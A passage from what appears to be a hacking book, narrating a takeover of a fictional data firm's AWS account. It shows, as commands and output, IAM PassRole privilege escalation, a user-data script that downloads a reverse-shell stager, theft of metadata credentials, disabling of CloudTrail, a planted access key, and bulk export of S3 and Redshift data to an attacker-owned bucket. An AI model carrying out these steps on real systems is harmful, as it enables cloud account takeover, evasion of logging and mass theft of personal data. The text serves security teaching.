+.11, 20200103, 20170103, RPU, US, 1101, 0...</code></pre>
+<p>That’s a list of clients, all right! We get not only current customers, but prospective ones as well. Details include when they were last approached, where, by whom, what the last service they purchased was, and how much they spent on the platform.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<span epub:type="pagebreak" title="213" id="Page_213"/><h2><span class="NoteHead">NOTE</span></h2>
+<p>	Machine learning algorithms do not deal well with widely spread numbers. It is therefore a common practice to scale down all numbers to the same range, like 0 to 1. If the highest annual income is €1M, then the 0.15 in the report is equivalent to €150K.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>Using this data, GP could get valuable insights into its customers’ spending habits and maybe establish hidden relationships between various properties, such as a meeting spot and revenue—who knows, the possibilities are endless. If you reach out to a data mining company, you should expect to be part of the experiment as well. That’s only fair.</p>
+<p>That’s one goal almost crossed off. We may be able to find more detailed information, but for now we have a solid list of potential and verified customers. We can google the political parties behind each line and weep for our illusory democracy.</p>
+<h3 id="h2-501263c12-0004">Finding Raw Data</h3>
+<p class="BodyFirst">The gretsch-finance bucket proved to be a winner. Let’s check the rest of the buckets:</p>
+<pre><code>root@Point1:~notebooks/# <b>egrep -R "s3[a|n]://" *</b>
+s3a://gretsch-hadoop/engine/aft-perf/...
+s3a://gretsch-hadoop-us1/nj/dmp/thirdparty/segments/...
+s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
+<var>--snip--</var></code></pre>
+<p>Profiles, social, segments, and so on. The filenames are endearing. This could very well be the user data we are after. Notice that the name of the gretsch-hadoop-us1 bucket suggests a regionalized partitioning. How many regions, and therefore Hadoop buckets, are there?</p>
+<pre><code>root@Point1:~/# <b>aws s3api list-buckets \</b>
+<b>--profile data1 \</b>
+<b>--query "Buckets[].Name"\| grep Hadoop</b>
+
+gretsch-hadoop-usw1
+gretsch-hadoop-euw1
+gretsch-hadoop-apse1</code></pre>
+<p>We find a Hadoop bucket for each of three AWS regions (Northern California, Ireland, and Singapore). We download 1,000 files from gretsch-hadoop-usw1 to see what kinds of artifacts it contains:</p>
+<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 \</b>
+<b>--profile data1 \</b>
+<b>--bucket=gretsch-hadoop-usw1 \</b>
+<b>--max-items 1000</b>
+
+"Key": "engine/advertiser-session/2019/06/19/15/08/user_sessions_stats.parquet",
+"Key": "engine/advertiser-session/2019/06/19/15/09/user_sessions_stats.parquet",
+<var>--snip--</var></code></pre>
+<p><span epub:type="pagebreak" title="214" id="Page_214"/>We see some files with the extension <em>.parquet</em>. <em>Parquet</em> is a file format known for its high compression ratio, which is achieved by storing data in a columnar format. It leverages the accurate observation that, in most databases, a column tends to store data of the same type (for example, integers), while a row is more likely to store different types of data. Instead of grouping data by row, like most DB engines do, Parquet groups them by column, thus achieving over 95 percent compression ratios.</p>
+<p>We install the necessary tools to decompress and manipulate <em>.parquet</em> files and then open a few random files:</p>
+<pre><code>root@Point1:~/# <b>python -m pip install parquet-cli</b>
+root@Point1:~/# <b>parq 02/user_sessions_stats.parquet -head 100</b>
+userid = c9e2b1905962fa0b344301540e615b628b4b2c9f
+interest_segment = 4878647678
+ts = 1557900000
+time_spent = 3
+last_ad  = 53f407233a5f0fe92bd462af6aa649fa
+last_provider = 34
+ip.geo.x = 52.31.46.2
+<var>--snip--</var>
+
+root@Point1:~/# <b>parq 03/perf_stats.parquet -head 100</b>
+click = 2
+referrer = 9735842
+deviceUID = 03108db-65f2-4d7c-b884-bb908d111400
+<var>--snip--</var>
+
+root@Point1:~/# <b>parq 03/social_stats.parquet -head 100</b>
+social_segment = 61895815510
+fb_profile = 3232698
+insta_profile = 987615915
+pinterest_profile = 57928
+<var>--snip--</var></code></pre>
+<p>We retrieve user IDs, social profiles, interest segments, time spent on ads, geolocation, and other alarming information tracking user behavior. Now we have something to show for our efforts. The data is erratic, stored in a specialized format and hardly decipherable, but we will figure it out eventually.</p>
+<p>We could provision a few terabytes of storage on our machine and proceed to fully pilfer these three buckets. Instead, we just instruct AWS to copy the bucket to our own account, but it needs a bit of tweaking to increase the pace first:</p>
+<pre><code>root@Point1:~/# <b>aws configure set default.s3.max_concurrent_requests 1000</b>
+root@Point1:~/# <b>aws configure set default.s3.max_queue_size 100000</b>
+root@Point1:~/# <b>aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop</b></code></pre>
+<p>We have all the data from the three Hadoop buckets. Don’t get too excited, though; this data is almost impossible to process without some hardcore exploration, business knowledge, and, of course, computing power. Let’s face it, we are way out of our league.</p>
+<p><span epub:type="pagebreak" title="215" id="Page_215"/>Gretsch Politico does this kind of processing every day with its little army of data experts. Can’t we leverage their work to steal the end result instead of reinventing the wheel from scratch?</p>
+<h2 id="h1-501263c12-0002">Stealing Processed Data</h2>
+<p class="BodyFirst">Data processing and data transformation on Spark are usually only the first step of a data’s lifecycle. Once the data is enriched with other inputs, cross-referenced, formatted, and scaled out, it is stored on a second medium. There, it can be explored by analysts (usually through some SQL-like engine) and eventually fed to training algorithms and prediction models (which may or may not run on Spark, of course).</p>
+<p>The question is, where does GP store its enriched and processed data? The quickest way to find out is to search the Jupyter notebooks for hints of analytical tool mentions, SQL-like queries, graphs and dashboards, and the like (see <a href="#listing12-9" id="listinganchor12-9">Listing 12-9</a>).</p>
+<pre><code>root@Point1:~notebooks/# <b>egrep -R -5 "sql|warehouse|snowflake|redshift|bigquery" *</b>
+
+redshift_endpoint = "sandbox.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com"
+
+engine_string = "postgresql+psycopg2://%s:%s@%s:5439/datalake"\
+% ("analytics-ro", "test", redshift_endpoint)
+
+engine = create_engine(engine_string)
+
+sql = """
+select insertion_id, ctr, cpm, ads_ratio, segmentID,...;
+"""
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing12-9">Listing 12-9</a>: SQL queries used in Jupyter notebooks</p>
+<p>Maybe we have found something worth investigating. Redshift is a managed PostgreSQL database on steroids, so much so that it is no longer appropriate to call it a database. It is often referred to as a <em>data lake</em>. It’s almost useless for querying a small table of 1,000 lines, but give it a few terabytes of data to ingest and it will respond with lightning speed! Its capacity can scale up as long as AWS has free servers (and the client has cash to spend, of course).</p>
+<p>Its notable speed, scalability, parallel upload capabilities, and integration with the AWS ecosystem position Redshift as one of the most efficient analytical databases in the field—and it’s probably the key to our salvation!</p>
+<p>Unfortunately, the credentials we retrieved belong to a sandbox database with irrelevant data. Furthermore, none of our AWS access keys can directly query the Redshift API:</p>
+<pre><code>root@Point1:~/# <b>aws redshift describe-clusters \</b>
+<b>--profile=data1 \</b>
+<b>--region eu-west-1</b>
+
+An error occurred (AccessDenied) when calling the DescribeClusters...</code></pre>
+<p>Time for some privilege escalation, it seems.</p>
+<h3 id="h2-501263c12-0005"><span epub:type="pagebreak" title="216" id="Page_216"/>Privilege Escalation</h3>
+<p class="BodyFirst">Going through the dozen IAM access keys we got, we realize that all of them belong to the same IAM group and thus share the same basic privileges—that is, read/write to a few buckets coupled with some light read-only IAM permissions:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-groups --profile=leslie</b>
+"GroupName": "spark-s3",
+
+root@Point1:~/# <b>aws iam list-groups --profile=marc</b>
+"GroupName": "spark-s3",
+
+root@Point1:~/# <b>aws iam list-groups --profile=camellia</b>
+"GroupName": "spark-debug",
+"GroupName": "spark-s3",
+
+<var>--snip--</var></code></pre>
+<p>Hold on. Camellia belongs to an additional group called <em>spark-debug</em>. Let’s take a closer look at the policies attached to this group:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-attach-group-policies --group-name spark-debug --profile=camellia</b>
+
+"PolicyName": "AmazonEC2FullAccess",
+"PolicyName": "iam-pass-role-spark",</code></pre>
+<p>Lovely. Camellia here is probably the person in charge of maintaining and running Spark clusters, hence the two policies she’s granted. EC2 full access opens the door to more than 450 possible actions on EC2, from starting instances to creating new VPCs, subnets, and pretty much anything related to the compute service.</p>
+<p>The second policy is custom-made, but we can easily guess what it implies: it allows us to assign roles to EC2 instances. We query the latest version of the policy document to assert our guess:</p>
+<pre><code># get policy version
+root@Point1:~/# <b>aws iam get-policy \</b>
+<b>--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \</b>
+<b>--profile camellia</b>
+
+"DefaultVersionId": "v1",
+
+# get policy content
+root@Point1:~/# <b>aws iam get-policy-version \</b>
+<b>--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \</b>
+<b>--version v1 \</b>
+<b>--profile camellia</b>
+
+"Action":"iam:PassRole",
+<span epub:type="pagebreak" title="217" id="Page_217"/><span class="CodeAnnotation" aria-label="annotation1">1</span> "Resource": "*"
+<var>--snip--</var></code></pre>
+<p>GP may not fully realize it, but with the IAM <code>PassRole</code> action, they have implicitly given dear Camellia—and, by extension, <em>us</em>—total control over their AWS account. <code>PassRole</code> is a powerful permission that allows us to assign a role to an instance. Any role <span class="CodeAnnotation" aria-label="annotation1">1</span>. Even an admin one. With <code>EC2 full access</code>, Camellia also manages EC2 instances and can start a machine, stamp it with an admin role, and take over the AWS account.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	Unlike MXR Ads, GP did not bother restricting IAM read-only calls to the user issuing the call—a common oversight in many companies that assign by default IAM <code>list*</code> and <code>get*</code> permissions to their users.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>Let’s explore our options in terms of which roles we, as Camellia, can pass to an EC2 instance. The only constraint is that the role needs to have <em>ec2.amazonaws.com</em> in its trust policy:</p>
+<pre><code>root@Point1:~/# <b>aws iam list-roles --profile camellia \</b>
+<b>| jq -r '.Roles[] | .RoleName + ", " + \</b>
+<b>.AssumeRolePolicyDocument.Statement[].Principal.Service' \</b>
+<b>| grep "ec2.amazonaws.com"</b>
+<var>--snip--</var>
+jenkins-cicd, ec2.amazonaws.com
+jenkins-jobs, ec2.amazonaws.com
+rundeck, ec2.amazonaws.com
+spark-master, ec2.amazonaws.com</code></pre>
+<p>Among the roles we see rundeck, which may just be our promised savior. Rundeck is an automation tool for running admin scripts on the infrastructure. GP’s infrastructure team did not seem too keen on using Jenkins, so they probably scheduled the bulk of their workload on Rundeck. Let’s use Camellia to see what permissions rundeck has:</p>
+<pre><code>root@Point1:~/# <b>aws iam get-attached-role-policies \</b>
+<b>--role-name rundeck \</b>
+<b>--profile camellia</b>
+
+"PolicyName": "rundeck-mono-policy",
+
+# get policy version
+root@Point1:~/# <b>aws iam get-policy --profile camellia \</b>
+<b>--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy</b>
+
+"DefaultVersionId": "v13",
+
+# get policy content
+root@Point1:~/# <b>aws iam get-policy-version \</b>
+<b>--version v13 \</b>
+<span epub:type="pagebreak" title="218" id="Page_218"/><b>--profile camellia \</b>
+<b>--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy</b>
+
+"Action":["ec2:*", "ecr:*", "iam:*", "rds:*", "redshift:*",...]
+"Resource": "*"
+<var>--snip--</var></code></pre>
+<p>Yes, that’s the role we need. The rundeck role has close to full admin privileges over AWS.</p>
+<p>The plan, therefore, is to spin up an instance in the same subnet as the Spark cluster. We carefully reproduce the same attributes to hide in plain sight: security groups, tags, everything. We’re finding the attributes so we can later imitate them:</p>
+<pre><code>root@Point1:~/# <b>aws ec2 describe-instances --profile camellia \</b>
+<b>--filters 'Name=tag:Name,Values=*spark*'</b>
+
+<var>--snip--</var>
+"Tags":
+  Key: Name  Value: spark-master-streaming
+"ImageId": "ami-02df9ea15c1778c9c",
+"InstanceType": "m5.xlarge",
+"SubnetId": "subnet-00580e48",
+"SecurityGroups":
+  GroupName: spark-master-all, GroupId: sg-06a91d40a5d42fe04
+  GroupName: spark-worker-all, GroupId: sg-00de21bc7c864cd25
+<var>--snip--</var></code></pre>
+<p>We know for a fact that Spark workers can reach the internet over port 443, so we just lazily copy and paste the security groups we just confirmed and launch a new instance with the rundeck profile with those attributes:</p>
+<pre><code>root@Point1:~/# <b>aws ec2 run-instances \</b>
+<b>--image-id ami-02df9ea15c1778c9c \</b>
+<b>--count 1 \</b>
+<b>--instance-type m3.medium \</b>
+<b>--iam-instance-profile rundeck \</b>
+<b>--subnet-id subnet-00580e48 \</b>
+<b>--security-group-ids sg-06a91d40a5d42fe04 \</b>
+<b>--tag-specifications 'ResourceType=instance,Tags=</b>
+<b>                      [{Key=Name,Value=spark-worker-5739ecea19a4}]' \</b>
+<b>--user-data file://my_user_data.sh \</b>
+<b>--profile camellia \</b>
+<b>--region eu-west-1</b></code></pre>
+<p>The script passed as user data (<em>my_user_data.sh</em>) will bootstrap our reverse shell:</p>
+<pre><code>#!/bin/bash
+wget https://gretsch-spark-eu.s3.amazonaws.com/stager
+chmod +x ./stager
+./stager&amp;</code></pre>
+<p><span epub:type="pagebreak" title="219" id="Page_219"/>We run the preceding AWS command and, sure enough, a minute or two later we get what we hope will be our last shell, along with admin privileges:</p>
+<pre><code>[*] https://0.0.0.0:443 handling request from...
+[*] https://0.0.0.0:443 handling request from...
+msf exploit(multi/handler) &gt; <b>sessions -i 9</b>
+[*] Starting interaction with 9...
+meterpreter &gt; <b>execute -i -H -f curl -a \</b>
+<b>http://169.254.169.254/latest/meta-data/iam/security-credentials/rundeck</b>
+
+"AccessKeyId" : "ASIA44ZRK6WS36YMZOCQ",
+"SecretAccessKey" : "rX8OA+2zCNaXqHrl2awNOCyJpIwu2FQroHFyfnGn ",
+"Token" : "IQoJb3JpZ2luX2VjEJr//////////wEaCWV1LXdlc3QtMSJ...</code></pre>
+<p>Brilliant! We get a bunch of top-security-level keys and tokens belonging to the rundeck role. Now that we have these keys, let’s query the classic services that may expose, to see what’s active (CloudTrail, GuardDuty, and Access Analyzer):</p>
+<pre><code>root@Point1:~/# <b>export AWS_PROFILE=rundeck</b>
+root@Point1:~/# <b>export AWS_REGION=eu-west-1</b>
+root@Point1:~/# <b>aws cloudtrail describe-trails</b>
+
+   "Name": "aggregated",
+   "S3BucketName": "gretsch-aggreg-logs",
+   "IncludeGlobalServiceEvents": true,
+   "IsMultiRegionTrail": true,
+   "HomeRegion": "eu-west-1",
+ <span class="CodeAnnotation" aria-label="annotation1">1</span>"HasInsightSelectors": false,
+
+root@Point1:~/# <b>aws guardduty list-detectors</b>
+"DetectorIds": []
+
+root@Point1:~/# <b>aws accessanalyzer list-analyzers</b>
+"analyzers": []</code></pre>
+<p>All right. CloudTrail is enabled as expected, so logs could be an issue. No big surprises there. Insights is disabled <span class="CodeAnnotation" aria-label="annotation1">1</span>, though, so we can afford some bulk-write API calls if need be. GuardDuty and Access Analyzer return empty lists, so are both absent from the mix as well.</p>
+<p>Let’s temporarily blind the log trail and slip an access key into Camellia’s user account to improve our persistence. Her privileges are quite enough should we want to regain access to GP’s account:</p>
+<pre><code>root@Point1:~/# <b>aws cloudtrail update-trail \</b>
+<b>--name aggregated \</b>
+<b>--no-include-global-service-events \</b>
+<b>--no-is-multi-region</b>
+
+root@Point1:~/# <b>aws iam list-access-keys --user-name camellia</b>
+
+<span epub:type="pagebreak" title="220" id="Page_220"/>"AccessKeyId": "AKIA44ZRK6WSXNQGVUX7",
+"Status": "Active",
+"CreateDate": "2019-12-13T18:26:17Z"
+
+root@Point1:~/# <b>aws iam create-access-key --user-name camellia</b>
+{
+    "AccessKey": {
+        "UserName": "camellia",
+        "AccessKeyId": "AKIA44ZRK6WSS2RB4CUX",
+        "SecretAccessKey": "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",
+        "CreateDate": "2019-12-21T18:20:04Z"
+    }
+}</code></pre>
+<p>Thirty minutes later, we clean up the EC2 instance and re-enable CloudTrail multiregion logging:</p>
+<pre><code>root@Point1:~/# <b>aws cloudtrail update-trail \</b>
+<b>--name aggregated \</b>
+<b>--include-global-service-events \</b>
+<b>--is-multi-region</b></code></pre>
+<p>Finally! We gained stable admin access to GP’s AWS account.</p>
+<h3 id="h2-501263c12-0006">Infiltrating Redshift</h3>
+<p class="BodyFirst">Now that we have secured access to GP’s AWS account, let’s poke around its Redshift clusters (see <a href="#listing12-10" id="listinganchor12-10">Listing 12-10</a>). That was our primary incentive to take over the account, after all.</p>
+<pre><code>root@Point1:~/# <b>aws redshift describe-clusters</b>
+"Clusters": [
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> ClusterIdentifier: bi,
+    NodeType: ra3.16xlarge, NumberOfNodes: 10,
+    "DBName": "datalake"
+<var>--snip--</var>
+
+ClusterIdentifier: sandbox
+    NodeType: dc2.large,  NumberOfNodes: 2,
+    "DBName": "datalake"
+<var>--snip--</var>
+
+ClusterIdentifier: reporting
+    NodeType: dc2.8xlarge, NumberOfNodes: 16,
+    "DBName": "datalake"
+<var>--snip--</var>
+
+ClusterIdentifier: finance, NodeType: dc2.8xlarge
+    NumberOfNodes: 24,
+    "DBName": "datalake"
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing12-10">Listing 12-10</a>: Listing the Redshift clusters</p>
+<p><span epub:type="pagebreak" title="221" id="Page_221"/>We get a bunch of clusters running on Redshift, with valuable info. Redshift was a good guess. You don’t spawn an ra3.16xlarge cluster <span class="CodeAnnotation" aria-label="annotation1">1</span> that supports 2.5TB per node just for the heck of it. That baby must easily cost north of $3,000 a day, which makes it all the more tempting to explore. The finance cluster may also hold some interesting data.</p>
+<p>Let’s zoom in on the information of the bi cluster in <a href="#listing12-10">Listing 12-10</a>. The initial database created when the cluster came to life is called <code>datalake</code>. The admin user is the traditional root user. The cluster is reachable at the address <em>bi.cae0svj50m2p.eu-west-1.redshift.amazonaws.com</em> on port 5439:</p>
+<pre><code>Clusters: [
+ClusterIdentifier: sandbox-test,
+NodeType: ra3.16xlarge,
+MasterUsername: root
+DBName: datalake,
+Endpoint: {
+  Address: bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com,
+  Port: 5439
+}
+VpcSecurityGroupId: sg-9f3a64e4, sg-a53f61de, sg-042c4a3f80a7e262c
+<var>--snip--</var></code></pre>
+<p>We take a look at the security groups for possible filtering rules preventing direct connections to the database:</p>
+<pre><code>root@Point1:~/# <b>aws ec2 describe-security-groups \</b>
+<b>--group-ids sg-9f3a64e4 sg-a53f61de</b>
+
+"IpPermissions": [ {
+  "ToPort": 5439,
+  "IpProtocol": "tcp",
+  "IpRanges": [
+       { "CidrIp": "52.210.98.176/32" },
+       { "CidrIp": "32.29.54.20/32" },
+       { "CidrIp": "10.0.0.0/8" },
+       { "CidrIp": "0.0.0.0/0" },</code></pre>
+<p>My favorite IP range of all time: 0.0.0.0/0. This unfiltered IP range was probably just used as temporary access granted to test a new SaaS integration or to run some queries. . . yet here we are. To be fair, since we already have access to GP’s network, this doesn’t matter to us much. The damage is already done.</p>
+<p>Redshift is so tightly coupled with the IAM service that we do not need to go hunting for credentials for the database. Since we have a beautiful <code>redshift:*</code> permission attached to our rundeck role, we just create a temporary password for any user account on the database (root included):</p>
+<pre><code>root@Point1:~/# <b>aws get-cluster-credentials \</b>
+<b>--db-user root \</b>
+<b>--db-name datalake\</b>
+<b>--cluster-identifier bi \</b>
+<b>--duration-seconds 3600</b>
+
+<span epub:type="pagebreak" title="222" id="Page_222"/>"DbUser": "IAM:root",
+"DbPassword": "AskFx8eXi0nlkMLKIxPHkvWfX0FSSeWm5gAheaQYhTCokEe",
+"Expiration": "2020-12-29T11:32:25.755Z"</code></pre>
+<p>With these database credentials, it’s just a matter of downloading the PostgreSQL client and pointing it to the Redshift endpoint:</p>
+<pre><code>root@Point1:~/# <b>apt install postgresql postgresql-contrib</b>
+root@Point1:~/# <b>PGPASSWORD='AskFx8eXi0nlkMLKIx...' \</b>
+<b>psql \</b>
+<b>-h bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com \</b>
+<b>-U root \</b>
+<b>-d datalake \</b>
+<b>-p 5439</b>
+<b>-c "SELECT tablename, columnname  FROM PG_TABLE_DEF where schemaname \</b>
+<b>='public'" &gt; list_tables_columns.txt</b></code></pre>
+<p>We export a comprehensive list of tables and columns (stored in the <code>PG_TABLE_DEF</code> table) and quickly close in on the interesting data:</p>
+<pre><code>root@Point1:~/# <b>cat list_tables_columns.txt</b>
+profile, id
+profile, name
+profile, lastname
+profile, social_id
+<var>--snip--</var>
+social, id
+social, link
+social, fb_likes
+social, fb_interest
+<var>--snip--</var>
+taxonomy, segment_name
+taxonomy, id
+taxonomy, reach
+taxonomy, provider
+<var>--snip--</var>
+interestgraph, id
+interestgraph, influence_axis
+interestgraph, action_axis
+<var>--snip--</var></code></pre>
+<p>Nothing beats a good old-fashioned SQL database where we can query and join data to our hearts’ content! This Redshift cluster is the junction of almost every data input poured into Gretsch Politico’s infrastructure.</p>
+<p>We find data related to MXR Ads’ performance and the impact it had on people’s behavior online. We have their full online activity, including a list of every website they visited that had a JavaScript tag related to GP, and even social media profiles tied to the people naïve enough to share such data with one of GP’s hidden partners. Then, of course, we have the classic data segments bought from data providers and what they call “lookalike <span epub:type="pagebreak" title="223" id="Page_223"/>segments”—that is, interests of population A projected over population B because they share some common properties, like the device they use, their behavior, and so on.</p>
+<p>We try building a SQL query that compiles most of this data into a single output to get a clearer visualization of what is going on:</p>
+<pre><code>SELECT p.gp_id, p.name, p.lastname, p.deviceType, p.last_loc,
+LISTAGG(a.referer), s.link, LISTAGG(s.fb_interest),
+LISTAGG(t.segment_name),
+i.action_y, i.influence_x, i.impulse_z
+
+FROM profile p
+JOIN ads a on p.ads_id = a.id
+JOIN social s on p.social_id= s.id
+JOIN taxonomy t on p.segment_id = t.id
+JOIN interestgraph i on p.graph_id = i.id
+GROUP BY p.gp_id
+LIMIT 2000</code></pre>
+<p>Drum roll, please. Ready? Go! Here’s one customer, Francis Dima:</p>
+<pre><code>p.gp_id:     d41d8cd98f00b204e9800998ecf8427e
+p.name:       Dima
+p.lastname:   Francis
+p.deviceType: iphone X
+p.last_loc_x: 50.06.16.3.N
+p.last_loc_y: 8.41.09.3.E
+a.referer:    www.okinawa.com/orderMeal,
+              transferwise.com/90537e4b29fb87fec18e451...,
+              aljazeera.com/news/hong-kong-protest...
+s.link:        https://www.facebook.com/dima.realworld.53301
+s.fb_interest: rock, metoo, fight4Freedom, legalizeIt...
+t.segment_name:politics_leaned_left,
+               politics_manigestation_rally,
+               health_medecine_average,
+               health_chronical_pain,...
+i.influence_x: 60
+i.action_y:    95
+i.impulse_z:   15
+
+<var>--snip--</var></code></pre>
+<p>The things you can learn about people by aggregating a few trackers. Poor Dima is tied to more than 160 data segments describing everything from his political activities to his cooking habits and medical history. We have the last 500 full URLs he visited, his last known location, his Facebook profile full of his likes and interests, and, most importantly, a character map enumerating his level of influence, impulse, and ad interaction. With this information, just think how easy it will be for GP to target this person—any person—to influence their opinion about any number of polarizing subjects . . . and, well, to sell democracy to the highest bidder.</p>
+<p><span epub:type="pagebreak" title="224" id="Page_224"/>The finance cluster is another living El Dorado. More than just transactional data, it contains every bit of information possible on every customer who has expressed the slightest interest in Gretsch Politico’s services, along with the creatives they ordered:</p>
+<pre><code>c.id:        357
+c.name:      IFR
+c.address:   Ruysdaelkade 51-HS
+c.city:      Amsterdam
+c.revenue:   549879.13
+c.creatives: s3://Gretsch-studio/IFR/9912575fe6a4av.mp4,...
+c.contact:   jan.vanurbin@udrc.com
+p.funnels:   mxads, instagram, facebook,...
+click_rate:  0.013
+real_visit:  0.004
+<var>--snip--</var>
+
+unload ('&lt;HUGE_SQL_QUERY&gt;') to 's3://data-export-profiles/gp/'</code></pre>
+<p>We export these two clusters in their entirety to an S3 bucket we own and start preparing our next move—a press conference, a movie, maybe a book. Who knows?</p>
+<h2 id="h1-501263c12-0003">Resources</h2>
+<ul>
+<li>A list of companies relying on Spark: <a href="https://spark.apache.org/powered-by.html" class="LinkURL">https://spark.apache.org/powered-by.html</a>.</li>
+<li>A list of Spark actions, from the Apache Spark documentation: <a href="http://bit.ly/3aW64Dh" class="LinkURL">http://bit.ly/3aW64Dh</a>.</li>
+<li>Redshift pricing details: <a href="https://aws.amazon.com/redshift/pricing/" class="LinkURL">https://aws.amazon.com/redshift/pricing/</a>.</li>
+<li>More details on <code>map</code> and <code>FlatMap</code>, with illustrations: <a href="https://data-flair.training/blogs/apache-spark-map-vs-flatmap/" class="LinkURL">https://data-flair.training/blogs/apache-spark-map-vs-flatmap/</a>.</li>
+</ul>
+</section>
+</body></html>
